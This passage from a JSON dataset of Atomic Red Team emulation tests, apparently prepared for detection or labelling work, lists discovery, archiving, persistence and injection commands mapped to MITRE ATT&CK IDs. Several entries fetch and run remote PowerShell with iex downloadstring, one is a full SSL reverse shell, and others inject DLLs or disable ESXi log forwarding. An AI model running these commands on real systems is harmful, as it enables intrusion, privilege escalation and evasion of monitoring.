        "Description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1069.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1422,
        "Command": "get-localgroup\nGet-LocalGroupMember -Name \"Administrators\"\n",
        "Description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1069.001",
        "Shell": "powershell"
    },
    {
        "ID": 1423,
        "Command": "New-Item -Path \"$env:TEMP\\SharpHound\\\" -ItemType Directory > $null\n& \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.exe\" -d \"$env:UserDnsDomain\" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory \"$env:TEMP\\SharpHound\\\"\n",
        "Description": "This module runs the Windows executable of SharpHound in order to remotely list members of the local Administrators group (SAMR)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1069.001",
        "Shell": "powershell"
    },
    {
        "ID": 1424,
        "Command": "wmic group get name\n",
        "Description": "Utilizing wmic.exe to enumerate groups on the local system. Upon execution, information will be displayed of local groups on system.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1069.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1425,
        "Command": "Get-WMIObject Win32_Group\n",
        "Description": "Utilizing PowerShell cmdlet - get-wmiobject, to enumerate local groups on the endpoint. Upon execution, Upon execution, information will be displayed of local groups on system.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1069.001",
        "Shell": "powershell"
    },
    {
        "ID": 1426,
        "Command": "docker build -t t1069 $PathtoAtomicsFolder/T1069.001/src/\ndocker run --name t1069_container --rm -d -t t1069\ndocker exec t1069_container ./test.sh",
        "Description": "Attackers may try to obtain a list of services that are operating on remote hosts and local network infrastructure devices, in order to identify potential vulnerabilities that can be exploited through remote software attacks. They typically use tools to conduct port and vulnerability scans in order to obtain this information.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1069.001",
        "Shell": "sh"
    },
    {
        "ID": 1427,
        "Command": "reg add \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\AtomicRedTeam\" /v \"Driver\" /d \"$PathToAtomicsFolder\\T1547.010\\bin\\PortMonitor.dll\" /t REG_SZ /f\n",
        "Description": "Add key-value pair to a Windows Port Monitor registry. On the subsequent reboot DLL will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.010",
        "Shell": "command_prompt"
    },
    {
        "ID": 1428,
        "Command": "\"%programfiles%/WinRAR/Rar.exe\" a -r %USERPROFILE%\\T1560.001-data.rar %USERPROFILE%\\*.txt\n",
        "Description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.\nWhen the test completes you should find the txt files from the %USERPROFILE% directory compressed in a file called T1560.001-data.rar in the %USERPROFILE% directory \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1560.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1429,
        "Command": "mkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"%programfiles%/WinRAR/Rar.exe\" a -hp\"blue\" hello.rar\ndir\n",
        "Description": "Note: Requires winrar installation\nrar a -p\"blue\" hello.rar (VARIANT)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1560.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1430,
        "Command": "path=%path%;\"C:\\Program Files (x86)\\winzip\"\nmkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"%ProgramFiles%\\WinZip\\winzip64.exe\" -min -a -s\"hello\" archive.zip *\ndir\n",
        "Description": "Note: Requires winzip installation\nwzzip sample.zip -s\"blueblue\" *.txt (VARIANT)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1560.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1431,
        "Command": "mkdir $PathToAtomicsFolder\\T1560.001\\victim-files\ncd $PathToAtomicsFolder\\T1560.001\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"%ProgramFiles%\\7-zip\\7z.exe\" u archive.7z *txt -pblue\ndir\n",
        "Description": "Note: This test requires 7zip installation\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1560.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1432,
        "Command": "zip $HOME/data.zip /var/log/{w,b}tmp\n",
        "Description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard zip compression.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1560.001",
        "Shell": "bash"
    },
    {
        "ID": 1433,
        "Command": "test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo 'confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)\n",
        "Description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1560.001",
        "Shell": "sh"
    },
    {
        "ID": 1434,
        "Command": "tar -cvzf $HOME/data.tar.gz $HOME/$USERNAME\n",
        "Description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1560.001",
        "Shell": "sh"
    },
    {
        "ID": 1435,
        "Command": "mkdir -p /tmp/T1560\ncd /tmp/T1560; touch a b c d e f g\nzip --password \"InsertPasswordHere\" /tmp/T1560/T1560 ./*\necho \"InsertPasswordHere\" | gpg --batch --yes --passphrase-fd 0 --output /tmp/T1560/T1560.zip.gpg -c /tmp/T1560/T1560.zip\nls -l /tmp/T1560\n",
        "Description": "Encrypt data for exiltration\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1560.001",
        "Shell": "sh"
    },
    {
        "ID": 1436,
        "Command": "zip -r  /tmp/t1560/t1560_data.zip /tmp/t1560\nopenssl enc -aes-256-cbc -pass pass:atomic_enc_pass -p -in /tmp/t1560/t1560_data.zip -out /tmp/t1560/t1560_data.enc \ncat /tmp/t1560/t1560_data.enc | base64",
        "Description": "An adversary may compress all the collected data, encrypt and send them to a C2 server using base64 encoding. \nThis atomic test tries to emulate the behaviour of the FLEXIROOT backdoor to archive the collected data. FLEXIROOT typically utilizes AES encryption and base64 encoding to transfer the encrypted data to the C2 server. \nIn this test, standard zip compression and the OpenSSL library are used to encrypt the compressed data.\nhttps://attack.mitre.org/versions/v7/software/S0267/",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1560.001",
        "Shell": "bash"
    },
    {
        "ID": 1437,
        "Command": "# Extract line with IP address from the syslog configuration output\nPathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe -ssh atomic.local -l root -pw n/a -m PathToAtomicsFolder\\..\\atomics\\T1560.001\\src\\esxi_get_loghost.txt | findstr /r \"[0-9]*\\.[0-9]*\\.[0-9]*\\.\" > c:\\temp\\loghost.txt\n\n# Replace the IP with \"0\"\nPathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe -ssh atomic.local -l root -pw n/a -m PathToAtomicsFolder\\..\\atomics\\T1560.001\\src\\esxi_remove_loghost.txt\n\n# Extract the IP from the line extracted from findstr\n$inputFilePath = \"c:\\temp\\loghost.txt\"\n$outputFilePath = \"c:\\temp\\loghost_ip.txt\"\n\n$fileContent = Get-Content -Path $inputFilePath -Raw\n\nif ([string]::IsNullOrWhiteSpace($fileContent)) {\n\\tWrite-Host \"The content is $fileContent\"\n\\tWrite-Host \"The file is empty\"\n} else {\n\\t# Use a regular expression to extract IP addresses\n\\t$ipAddresses = [regex]::Matches($fileContent, '(udp|tcp):\\/\\/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*').Value\n\\t\n\\t$output = \"esxcli system syslog config set --loghost=\" + $ipAddresses\n\n\\t$output | Out-File -FilePath $outputFilePath -Encoding ascii\n\\t\n\\tWrite-Host \"IP addresses extracted and saved to $outputFilePath\"\n}\n",
        "Description": "An adversary may edit the syslog config to remove the loghost in order to prevent or redirect logs being received by SIEM.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1560.001",
        "Shell": "powershell"
    },
    {
        "ID": 1438,
        "Command": "makecab.exe C:\\Temp\\sam.hiv C:\\Temp\\art.zip\n",
        "Description": "An adversary may compress data using Makecab (in-built Windows binary) that is collected prior to exfiltration.\n[reference](https://unit42.paloaltonetworks.com/exchange-server-credential-harvesting/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1560.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1439,
        "Command": "systeminfo\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\n",
        "Description": "Identify System Info. Upon execution, system info and time info will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "command_prompt"
    },
    {
        "ID": 1440,
        "Command": "system_profiler\nls -al /Applications\n",
        "Description": "Identify System Info\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "sh"
    },
    {
        "ID": 1441,
        "Command": "uname -a >> /tmp/T1082.txt\nif [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> /tmp/T1082.txt; fi\nif [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> /tmp/T1082.txt; fi   \nif [ -f /etc/issue ]; then cat /etc/issue >> /tmp/T1082.txt; fi\nif [ -f /etc/os-release ]; then cat /etc/os-release >> /tmp/T1082.txt; fi\nuptime >> /tmp/T1082.txt\ncat /tmp/T1082.txt 2>/dev/null\n",
        "Description": "Identify System Info\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "sh"
    },
    {
        "ID": 1442,
        "Command": "if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi\nif [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i \"Droplet\\|HVM\\|VirtualBox\\|VMware\"; fi\nif [ -f /sys/class/dmi/id/chassis_vendor ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i \"Xen\\|Bochs\\|QEMU\"; fi\nif [ -x \"$(command -v dmidecode)\" ]; then sudo dmidecode | grep -i \"microsoft\\|vmware\\|virtualbox\\|quemu\\|domu\"; fi\nif [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i \"vmware\\|vbox\"; fi\nif [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i \"vmware\\|vbox\\|qemu\\|virtual\"; fi\nif [ -x \"$(command -v lspci)\" ]; then sudo lspci | grep -i \"vmware\\|virtualbox\"; fi\nif [ -x \"$(command -v lscpu)\" ]; then sudo lscpu | grep -i \"Xen\\|KVM\\|Microsoft\"; fi\n",
        "Description": "Identify virtual machine hardware. This technique is used by the Pupy RAT and other malware.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "bash"
    },
    {
        "ID": 1443,
        "Command": "sudo lsmod | grep -i \"vboxsf\\|vboxguest\"\nsudo lsmod | grep -i \"vmw_baloon\\|vmxnet\"\nsudo lsmod | grep -i \"xen-vbd\\|xen-vnif\"\nsudo lsmod | grep -i \"virtio_pci\\|virtio_net\"\nsudo lsmod | grep -i \"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc\"\n",
        "Description": "Identify virtual machine guest kernel modules. This technique is used by the Pupy RAT and other malware.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "bash"
    },
    {
        "ID": 1444,
        "Command": "kldstat | grep -i \"vmm\"\nkldstat | grep -i \"vbox\"\n",
        "Description": "Identify virtual machine host kernel modules.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "sh"
    },
    {
        "ID": 1445,
        "Command": "hostname\n",
        "Description": "Identify system hostname for Windows. Upon execution, the hostname of the device will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "command_prompt"
    },
    {
        "ID": 1446,
        "Command": "hostname\n",
        "Description": "Identify system hostname for FreeBSD, Linux and macOS systems.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "sh"
    },
    {
        "ID": 1447,
        "Command": "REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid\n",
        "Description": "Identify the Windows MachineGUID value for a system. Upon execution, the machine GUID will be displayed from registry.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "command_prompt"
    },
    {
        "ID": 1448,
        "Command": "cscript \"PathToAtomicsFolder\\T1082\\src\\griffon_recon.vbs\"\n",
        "Description": "This script emulates the reconnaissance script seen in used by Griffon and was modified by security researcher Kirk Sayre \nin order simply print the recon results to the screen as opposed to exfiltrating them. [Script](https://gist.github.com/kirk-sayre-work/7cb5bf4e2c7c77fa5684ddc17053f1e5).  \nFor more information see also [https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon](https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon) and [https://attack.mitre.org/software/S0417/](https://attack.mitre.org/software/S0417/)",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "powershell"
    },
    {
        "ID": 1449,
        "Command": "set\n",
        "Description": "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "command_prompt"
    },
    {
        "ID": 1450,
        "Command": "env\n",
        "Description": "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "sh"
    },
    {
        "ID": 1451,
        "Command": "csrutil status\n",
        "Description": "Read and Display System Intergrety Protection status. csrutil is commonly used by malware and post-exploitation tools to determine whether certain files and directories on the system are writable or not.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "sh"
    },
    {
        "ID": 1452,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nwinPEAS -noninteractive -consoleoutput",
        "Description": "Discover Local Privilege Escalation possibilities using winPEAS function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "powershell"
    },
    {
        "ID": 1453,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nitm4nprivesc -noninteractive -consoleoutput",
        "Description": "Discover Local Privilege Escalation possibilities using itm4nprivesc function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "powershell"
    },
    {
        "ID": 1454,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\noldchecks -noninteractive -consoleoutput",
        "Description": "Powersploits privesc checks using oldchecks function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "powershell"
    },
    {
        "ID": 1455,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\notherchecks -noninteractive -consoleoutput",
        "Description": "General privesc checks using the otherchecks function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "powershell"
    },
    {
        "ID": 1456,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGeneralrecon -consoleoutput -noninteractive",
        "Description": "Collect general computer informations via GeneralRecon function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "powershell"
    },
    {
        "ID": 1457,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nMorerecon -noninteractive -consoleoutput",
        "Description": "Gathers local system information using the Morerecon function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "powershell"
    },
    {
        "ID": 1458,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nRBCD-Check -consoleoutput -noninteractive",
        "Description": "Search for Resource-Based Constrained Delegation attack paths using RBCD-Check function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "powershell"
    },
    {
        "ID": 1459,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')\nInvoke-watson",
        "Description": "PowerSharpPack - Watson searching for missing windows patches  technique via function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "powershell"
    },
    {
        "ID": 1460,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')\nInvoke-SharpUp -command \"audit\"",
        "Description": "PowerSharpPack - Sharpup checking common Privesc vectors technique via function of WinPwn - Takes several minutes to complete.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "powershell"
    },
    {
        "ID": 1461,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')\nInvoke-Seatbelt -Command \"-group=all\"",
        "Description": "PowerSharpPack - Seatbelt technique via function of WinPwn.\n\n[Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "powershell"
    },
    {
        "ID": 1462,
        "Command": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\AzureStealth.ps1\" -force\\t  \n$Password = ConvertTo-SecureString -String \"T1082Az\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"\", $Password\nConnect-AzAccount -Credential $Credential\nConnect-AzureAD -Credential $Credential\nScan-AzureAdmins -UseCurrentCred\n",
        "Description": "Upon successful execution, this test will utilize a valid read-only Azure AD user's credentials to conduct a security scan and determine what users exist in a given tenant, as well as identify any admin users. \nOnce the test is complete, a folder will be output to the temp directory that contains 3 csv files which provide info on the discovered users. \nSee https://github.com/cyberark/SkyArk \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "powershell"
    },
    {
        "ID": 1463,
        "Command": "lsmod\nkmod list\ngrep vmw /proc/modules\n",
        "Description": "Enumerate kernel modules installed 3 different ways. Upon successful execution stdout will display kernel modules installed on host 2 times, followed by list of modules matching 'vmw' if present.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "sh"
    },
    {
        "ID": 1464,
        "Command": "kldstat\nkldstat | grep vmm\n",
        "Description": "Enumerate kernel modules loaded. Upon successful execution stdout will display kernel modules loaded, followed by list of modules matching 'vmm' if present.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "sh"
    },
    {
        "ID": 1465,
        "Command": "wmic cpu get name\nwmic MEMPHYSICAL get MaxCapacity\nwmic baseboard get product\nwmic baseboard get version\nwmic bios get SMBIOSBIOSVersion\nwmic path win32_VideoController get name\nwmic path win32_VideoController get DriverVersion\nwmic path win32_VideoController get VideoModeDescription\nwmic OS get Caption,OSArchitecture,Version\nwmic DISKDRIVE get Caption\nGet-WmiObject win32_bios\n",
        "Description": "Identify system information with the WMI command-line (WMIC) utility. Upon execution, various system information will be displayed, including: OS, CPU, GPU, and disk drive names; memory capacity; display resolution; and baseboard, BIOS, and GPU driver products/versions.\nhttps://nwgat.ninja/getting-system-information-with-wmic-on-windows/\nElements of this test were observed in the wild used by Aurora Stealer in late 2022 and early 2023, as highlighted in public reporting:\nhttps://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar\nhttps://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "command_prompt"
    },
    {
        "ID": 1466,
        "Command": "wscript.exe C:\\Windows\\System32\\gatherNetworkInfo.vbs\n",
        "Description": "The script gathernetworkinfo.vbs is employed to collect system information such as the operating system, DNS details, firewall configuration, etc. Outputs are stored in c:\\Windows\\System32\\config or c:\\Windows\\System32\\reg. https://www.verboon.info/2011/06/the-gathernetworkinfo-vbs-script/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "command_prompt"
    },
    {
        "ID": 1467,
        "Command": "reg query \"HKEY_CURRENT_USER\\Control Panel\\International\\Geo\"\n",
        "Description": "Looks up country code configured in the registry, likely geofence. Upon execution, country code info will be displayed.\n- https://tria.ge/210111-eaz8mqhgh6/behavioral1\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "command_prompt"
    },
    {
        "ID": 1468,
        "Command": "reg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v SystemBiosVersion\nreg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v VideoBiosVersion\n",
        "Description": "Looks up for BIOS information in the registry. BIOS information is often read in order to detect sandboxing environments.  Upon execution, BIOS information will be displayed.\n- https://tria.ge/210111-eaz8mqhgh6/behavioral1\n- https://evasions.checkpoint.com/techniques/registry.html\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "command_prompt"
    },
    {
        "ID": 1469,
        "Command": "echo \"\" | \"PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe\" \"atomic.local\" -ssh  -l \"root\" -pw \"pass\" -m \"PathToAtomicsFolder\\T1082\\src\\esx_vmdiscovery.txt\"\n",
        "Description": "An adversary will using ESXCLI to enumerate the Virtual Machines on the host prior to executing power off routine.\n[Reference](https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "command_prompt"
    },
    {
        "ID": 1470,
        "Command": "echo \"\" | \"PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe\" \"atomic.local\" -ssh  -l \"root\" -pw \"pass\" -m \"PathToAtomicsFolder\\T1082\\src\\esx_darkside_discovery.txt\"\n",
        "Description": "Darkside ransomware utilises various ESXCLI commands to obtain information about the ESXi Host.\n[Reference](https://www.trendmicro.com/en_ph/research/21/e/darkside-linux-vms-targeted.html)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "command_prompt"
    },
    {
        "ID": 1471,
        "Command": "sysctl -n hw.model",
        "Description": "Gets the macOS hardware information, which can be used to determine whether the target macOS host is running on a physical or virtual machine. sysctl can be used to gather interesting macOS host data, including hardware information, memory size, logical cpu information, etc.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "sh"
    },
    {
        "ID": 1472,
        "Command": "Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, ServicePackMajorVersion, OSArchitecture, CSName, WindowsDirectory | Out-null",
        "Description": "operating system discovery using get-ciminstance\nhttps://petri.com/getting-operating-system-information-powershell/",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "powershell"
    },
    {
        "ID": 1473,
        "Command": "ver",
        "Description": "Ver command shows information about os version.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "command_prompt"
    },
    {
        "ID": 1474,
        "Command": "vssadmin.exe list shadows",
        "Description": "The command shows all available volume shadow copies, along with their creation time and location.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "command_prompt"
    },
    {
        "ID": 1475,
        "Command": "powershell.exe -c \"Get-Culture | Format-List | Out-File -FilePath %TMP%\\a.txt\"\n",
        "Description": "This action demonstrates how an attacker might gather a system's region and language settings using PowerShell, which could aid in profiling \nthe machine's location and user language preferences. The command outputs system locale details to a temporary file for further analysis.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "command_prompt"
    },
    {
        "ID": 1476,
        "Command": "powershell.exe -c \"gdr -PSProvider 'FileSystem'\"\n",
        "Description": "This test simulates an attacker attempting to list the available drives on the system to gather data about file storage locations.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "command_prompt"
    },
    {
        "ID": 1477,
        "Command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v ProductName\n",
        "Description": "Identify the Operating System Product Name via registry with the reg.exe command.\nUpon execution, the OS Product Name will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "command_prompt"
    },
    {
        "ID": 1478,
        "Command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v CurrentBuildNumber\n",
        "Description": "Identify the Operating System Build Number via registry with the reg.exe command.\nUpon execution, the OS Build Number will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1082",
        "Shell": "command_prompt"
    },
    {
        "ID": 1479,
        "Command": "$mypid = (Start-Process notepad -PassThru).id\nmavinject $mypid /INJECTRUNNING \"PathToAtomicsFolder\\T1055.001\\src\\x64\\T1055.001.dll\"\nStop-Process -processname notepad\n",
        "Description": "Windows 10 Utility To Inject DLLS.\n\nUpon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.\nWith default arguments, expect to see a MessageBox, with notepad's icon in taskbar.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055.001",
        "Shell": "powershell"
    },
    {
        "ID": 1480,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')",
        "Description": "Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique via function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055.001",
        "Shell": "powershell"
    },
    {
        "ID": 1481,
        "Command": "$server_ip = 127.0.0.1\n$server_port = 443\n$socket = New-Object Net.Sockets.TcpClient('127.0.0.1', '443')\n$stream = $socket.GetStream()\n$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))\n$sslStream.AuthenticateAsClient('fakedomain.example', $null, \"Tls12\", $false)\n$writer = new-object System.IO.StreamWriter($sslStream)\n$writer.Write('PS ' + (pwd).Path + '> ')\n$writer.flush()\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)\n{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n$sendback = (iex $data | Out-String ) 2>&1;\n$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}\n",
        "Description": "Thanks to @OrOneEqualsOne for this quick C2 method.\nThis is to test to see if a C2 session can be established using an SSL socket.\nMore information about this technique, including how to set up the listener, can be found here:\nhttps://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926\n\nUpon successful execution, powershell will make a network connection to 127.0.0.1 over 443.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1573",
        "Shell": "powershell"
    },
    {
        "ID": 1482,
        "Command": "mavinject $pid /INJECTRUNNING \"PathToAtomicsFolder\\T1056.004\\bin\\T1056.004x64.dll\"\nInvoke-WebRequest https://www.example.com -UseBasicParsing\n",
        "Description": "Hooks functions in PowerShell to read TLS Communications\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1056.004",
        "Shell": "powershell"
    },
    {
